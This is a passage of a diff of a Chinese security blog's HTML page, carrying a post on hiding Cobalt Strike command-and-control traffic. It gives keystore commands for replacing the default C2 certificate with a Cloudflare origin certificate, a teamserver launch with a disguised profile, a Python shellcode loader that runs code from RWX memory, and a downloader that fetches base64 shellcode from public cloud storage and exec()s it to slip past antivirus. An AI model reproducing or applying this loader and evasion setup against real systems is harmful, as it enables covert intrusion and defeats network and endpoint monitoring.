+<h2 id="防特征审计-SSL证书"><a href="#防特征审计-SSL证书" class="headerlink" title="防特征审计-SSL证书"></a>防特征审计-SSL证书</h2><h4 id="1、配置SSL设置"><a href="#1、配置SSL设置" class="headerlink" title="1、配置SSL设置"></a>1、配置SSL设置</h4><p>创建证书（SSL-源服务器）<br>在cloudflare创建证书<br><img src="/posts/a28d2b5c/image-20220906104458013.png" alt="image-20220906104458013"><br><img src="/posts/a28d2b5c/image-20220906104537158.png" alt="image-20220906104537158"><br>将Origin Certificate保存到本地命名为sever.pem,Private Key保存为sever.key<br><img src="/posts/a28d2b5c/image-20220906104832429.png" alt="image-20220906104832429"><br>设置页面规则(缓存级别-绕过)<br><img src="/posts/a28d2b5c/image-20220906105158083.png" alt="image-20220906105158083"><br><img src="/posts/a28d2b5c/image-20220906105336222.png" alt="image-20220906105336222"><br>url处为域名加上&#x2F;*js</p>
 <h4 id="2、生成证书文件"><a href="#2、生成证书文件" class="headerlink" title="2、生成证书文件"></a>2、生成证书文件</h4><p>把刚才保存的两个文件传到服务器<br>运行下面两条命令注意修改为自己的域名</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">openssl pkcs12 -export -<span class="hljs-keyword">in</span> server<span class="hljs-selector-class">.pem</span> -inkey server<span class="hljs-selector-class">.key</span> -out www<span class="hljs-selector-class">.woaikansese</span><span class="hljs-selector-class">.shop</span><span class="hljs-selector-class">.p12</span> -name www<span class="hljs-selector-class">.woaikansese</span><span class="hljs-selector-class">.shop</span> -passout pass:<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">keytool -importkeystore -deststorepass <span class="hljs-number">123456</span> -destkeypass <span class="hljs-number">123456</span> -destkeystore www<span class="hljs-selector-class">.woaikansese</span><span class="hljs-selector-class">.shop</span><span class="hljs-selector-class">.store</span> -srckeystore www<span class="hljs-selector-class">.woaikansese</span><span class="hljs-selector-class">.shop</span><span class="hljs-selector-class">.p12</span> -srcstoretype PKCS12 -srcstorepass <span class="hljs-number">123456</span> -alias www<span class="hljs-selector-class">.woaikansese</span>.shop<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in server.pem -inkey server.key -out www.woaikansese.shop.p12 -name www.woaikansese.shop -passout pass:123456</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore www.woaikansese.shop.store -srckeystore www.woaikansese.shop.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias www.woaikansese.shop</span><br></pre></td></tr></table></figure>
 <p>会生成一个<a target="_blank" rel="noopener" href="http://www.woaikansese.shop.store文件/">www.woaikansese.shop.store文件</a></p>
 <h4 id="3、修改teamserver"><a href="#3、修改teamserver" class="headerlink" title="3、修改teamserver"></a>3、修改teamserver</h4><p>证书指向：<a target="_blank" rel="noopener" href="http://www.woaikansese.shop.store/">www.woaikansese.shop.store</a><br>修改最后一行</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">原:-Djavax.net.ssl.keyStore=./cobaltstrike.store</span><br>-Djavax.net.ssl.keyStore=./www.woaikansese.shop.store<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">原:-Djavax.net.ssl.keyStore=./cobaltstrike.store</span></span><br><span class="line">-Djavax.net.ssl.keyStore=./www.woaikansese.shop.store</span><br></pre></td></tr></table></figure>
 <p>证书密码：123456</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">原:-Djavax.net.ssl.keyStorePassword=Microsoft</span><br>-Djavax.net.ssl.keyStorePassword=123456<br></code></pre></td></tr></table></figure>
-<h4 id="4、启动teamserver"><a href="#4、启动teamserver" class="headerlink" title="4、启动teamserver"></a>4、启动teamserver</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">./teamserver <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> passwd jquery-<span class="hljs-keyword">c</span><span class="hljs-number">2.4</span>.<span class="hljs-number">5</span>.profile<br></code></pre></td></tr></table></figure>
-<p>创建一个https的监听器<br><img src="/posts/a28d2b5c/image-20220906122429149.png" srcset="/img/loading.gif" lazyload alt="image-20220906122429149"><br>还是使用Stageless模式的马<br>证书特征修改成功 成功上线<br><img src="/posts/a28d2b5c/image-20220906162918608.png" srcset="/img/loading.gif" lazyload alt="image-20220906162918608"><br><img src="/posts/a28d2b5c/image-20220906163921303.png" srcset="/img/loading.gif" lazyload alt="image-20220906163921303"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">原:-Djavax.net.ssl.keyStorePassword=Microsoft</span></span><br><span class="line">-Djavax.net.ssl.keyStorePassword=123456</span><br></pre></td></tr></table></figure>
+<h4 id="4、启动teamserver"><a href="#4、启动teamserver" class="headerlink" title="4、启动teamserver"></a>4、启动teamserver</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver x.x.x.x passwd jquery-c2.4.5.profile</span><br></pre></td></tr></table></figure>
+<p>创建一个https的监听器<br><img src="/posts/a28d2b5c/image-20220906122429149.png" alt="image-20220906122429149"><br>还是使用Stageless模式的马<br>证书特征修改成功 成功上线<br><img src="/posts/a28d2b5c/image-20220906162918608.png" alt="image-20220906162918608"><br><img src="/posts/a28d2b5c/image-20220906163921303.png" alt="image-20220906163921303"></p>
 <h2 id="防流量审计-OSS存储"><a href="#防流量审计-OSS存储" class="headerlink" title="防流量审计-OSS存储"></a>防流量审计-OSS存储</h2><p>把数据放到oss oss域名是一个绿标可能会认为是一下资源在加载杀毒软件会放行<br>产品：阿里云，腾讯云等</p>
 <h4 id="1、开启OSS对象存储"><a href="#1、开启OSS对象存储" class="headerlink" title="1、开启OSS对象存储"></a>1、开启OSS对象存储</h4><p>在阿里云购买OSS服务<a target="_blank" rel="noopener" href="https://www.aliyun.com/product/oss">https://www.aliyun.com/product/oss</a></p>
-<h4 id="2、创建Bucket列表"><a href="#2、创建Bucket列表" class="headerlink" title="2、创建Bucket列表"></a>2、创建Bucket列表</h4><p><img src="/posts/a28d2b5c/image-20220906183907524.png" srcset="/img/loading.gif" lazyload alt="image-20220906183907524"><br>注意读写权限要选择:公共读<br><img src="/posts/a28d2b5c/image-20220906184033570.png" srcset="/img/loading.gif" lazyload alt="image-20220906184033570"></p>
-<h4 id="3、上传Shellcode文件"><a href="#3、上传Shellcode文件" class="headerlink" title="3、上传Shellcode文件"></a>3、上传Shellcode文件</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br>shellcode = <span class="hljs-string">b&quot;**shellcode**&quot;</span> <span class="hljs-comment"># CS生成shellcode	32位还是64位根据python位数而定</span><br><span class="hljs-comment">#64位python加载代码 </span><br>ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64<br>rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(shellcode), <span class="hljs-number">0x3000</span>, <span class="hljs-number">0x40</span>)<br>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), <span class="hljs-built_in">len</span>(shellcode))<br>handle = ctypes.windll.kernel32.CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ctypes.c_uint64(rwxpage), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
-<p>将上面代码填入shellcode，base64加密后上传到阿里云oss<br><img src="/posts/a28d2b5c/image-20220906185553274.png" srcset="/img/loading.gif" lazyload alt="image-20220906185553274"><br>注意选择共有读或者 继承 Bucket<br><img src="/posts/a28d2b5c/image-20220906185632114.png" srcset="/img/loading.gif" lazyload alt="image-20220906185632114"></p>
+<h4 id="2、创建Bucket列表"><a href="#2、创建Bucket列表" class="headerlink" title="2、创建Bucket列表"></a>2、创建Bucket列表</h4><p><img src="/posts/a28d2b5c/image-20220906183907524.png" alt="image-20220906183907524"><br>注意读写权限要选择:公共读<br><img src="/posts/a28d2b5c/image-20220906184033570.png" alt="image-20220906184033570"></p>
+<h4 id="3、上传Shellcode文件"><a href="#3、上传Shellcode文件" class="headerlink" title="3、上传Shellcode文件"></a>3、上传Shellcode文件</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode = <span class="string">b&quot;**shellcode**&quot;</span> <span class="comment"># CS生成shellcode	32位还是64位根据python位数而定</span></span><br><span class="line"><span class="comment">#64位python加载代码 </span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>将上面代码填入shellcode，base64加密后上传到阿里云oss<br><img src="/posts/a28d2b5c/image-20220906185553274.png" alt="image-20220906185553274"><br>注意选择共有读或者 继承 Bucket<br><img src="/posts/a28d2b5c/image-20220906185632114.png" alt="image-20220906185632114"></p>
 <h4 id="4、获取地址-amp-代码加载"><a href="#4、获取地址-amp-代码加载" class="headerlink" title="4、获取地址&amp;代码加载"></a>4、获取地址&amp;代码加载</h4><p>上传完成后点击分析获取链接填入下面上线代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes,base64<br><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br>myURL = urlopen(<span class="hljs-string">&quot;OSS获取到的URL&quot;</span>)<br>z=myURL.read()<br>zx=base64.b64decode(z)<br><span class="hljs-built_in">exec</span>(zx)<br></code></pre></td></tr></table></figure>
-<p><img src="/posts/a28d2b5c/image-20220906185900487.png" srcset="/img/loading.gif" lazyload alt="image-20220906185900487"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,base64</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">myURL = urlopen(<span class="string">&quot;OSS获取到的URL&quot;</span>)</span><br><span class="line">z=myURL.read()</span><br><span class="line">zx=base64.b64decode(z)</span><br><span class="line"><span class="built_in">exec</span>(zx)</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/a28d2b5c/image-20220906185900487.png" alt="image-20220906185900487"></p>
 
-                
-              </div>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
             
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/CobaltStrike/">#CobaltStrike</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>CobaltStrike流量隐匿</div>
-      <div>http://example.com/posts/a28d2b5c/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>F4tty</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年9月6日</div>
-        </div>
-      
-      
-      <div class="license-meta-item">
-        <div>许可协议</div>
-        <div>
-          
-            
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-              <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                <i class="iconfont icon-by"></i>
-              </span>
+              <a href="/posts/2f863dad/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
               </a>
             
-          
-        </div>
-      </div>
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/posts/225ec2c9/" title="域信息收集">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">域信息收集</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/posts/2f863dad/" title="CobaltStrike简单二开学习记录(下)">
-                        <span class="hidden-mobile">CobaltStrike简单二开学习记录(下)</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-09-06 00:00:00
+            </span>
             
-          </article>
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/CobaltStrike/" title="CobaltStrike">
+                        #CobaltStrike
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/posts/225ec2c9/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
         </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
       
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CobaltStrike%E6%B5%81%E9%87%8F%E9%9A%90%E5%8C%BF"><span class="toc-text">CobaltStrike流量隐匿</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%9C%94%E6%BA%90%E6%8B%89%E9%BB%91-CDN%E8%8A%82%E7%82%B9"><span class="toc-text">防朔源拉黑-CDN节点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%9C%A8godaddy%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7%EF%BC%8C%E4%B9%B0%E4%B8%AA%E5%9F%9F%E5%90%8D"><span class="toc-text">1、在godaddy注册账号，买个域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%9C%A8cloudflare%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7-%E7%84%B6%E5%90%8E%E6%B7%BB%E5%8A%A0%E5%9F%9F%E5%90%8D"><span class="toc-text">2、在cloudflare注册账号,然后添加域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%B7%BB%E5%8A%A0%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95%EF%BC%8C%E6%8C%87%E5%90%91CS%E7%9A%84IP"><span class="toc-text">3、添加解析记录，指向CS的IP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E9%85%8D%E7%BD%AEDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E4%BD%BF%E7%94%A8cloudflare"><span class="toc-text">4、配置DNS服务器，使用cloudflare</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E4%B8%8B%E8%BD%BDC2%E6%96%87%E4%BB%B6%E6%A8%A1%E7%89%88%EF%BC%8C%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E5%B9%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">5、下载C2文件模版，修改配置并上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81%E5%90%AF%E5%8A%A8CS%E5%8A%A0%E8%BD%BDCS%E6%A8%A1%E7%89%88%EF%BC%8C"><span class="toc-text">6、启动CS加载CS模版，</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E7%89%B9%E5%BE%81%E5%AE%A1%E8%AE%A1-SSL%E8%AF%81%E4%B9%A6"><span class="toc-text">防特征审计-SSL证书</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AESSL%E8%AE%BE%E7%BD%AE"><span class="toc-text">1、配置SSL设置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6"><span class="toc-text">2、生成证书文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E4%BF%AE%E6%94%B9teamserver"><span class="toc-text">3、修改teamserver</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E5%90%AF%E5%8A%A8teamserver"><span class="toc-text">4、启动teamserver</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%B5%81%E9%87%8F%E5%AE%A1%E8%AE%A1-OSS%E5%AD%98%E5%82%A8"><span class="toc-text">防流量审计-OSS存储</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%BC%80%E5%90%AFOSS%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8"><span class="toc-text">1、开启OSS对象存储</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%88%9B%E5%BB%BABucket%E5%88%97%E8%A1%A8"><span class="toc-text">2、创建Bucket列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E4%B8%8A%E4%BC%A0Shellcode%E6%96%87%E4%BB%B6"><span class="toc-text">3、上传Shellcode文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E8%8E%B7%E5%8F%96%E5%9C%B0%E5%9D%80-amp-%E4%BB%A3%E7%A0%81%E5%8A%A0%E8%BD%BD"><span class="toc-text">4、获取地址&amp;代码加载</span></a></li></ol></li></ol></li></ol></li></ol>
+      
     </div>
   </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
 </div>
 
 
+<script src="/js/backtotop.js"></script>
 
 
 
-  
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
 
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
       </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
+      <div class="search-result" id="search-result"></div>
     </div>
   </div>
-</div>
 
-    
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
 
-    
-  </main>
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
 
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-  
-  
-</div>
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
 
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
       }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
   </script>
 
 
 
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
